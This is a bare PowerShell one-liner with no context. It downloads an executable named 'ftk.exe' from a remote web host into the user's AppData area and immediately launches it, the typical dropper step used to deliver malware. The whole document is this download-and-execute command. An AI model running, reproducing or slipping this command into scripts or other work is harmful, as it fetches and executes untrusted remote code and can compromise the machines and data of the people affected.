(new-object system.net.webclient).downloadfile('http://martinweiser.net/ftk.exe','%appdata%.exe');start-process '%appdata%.exe'
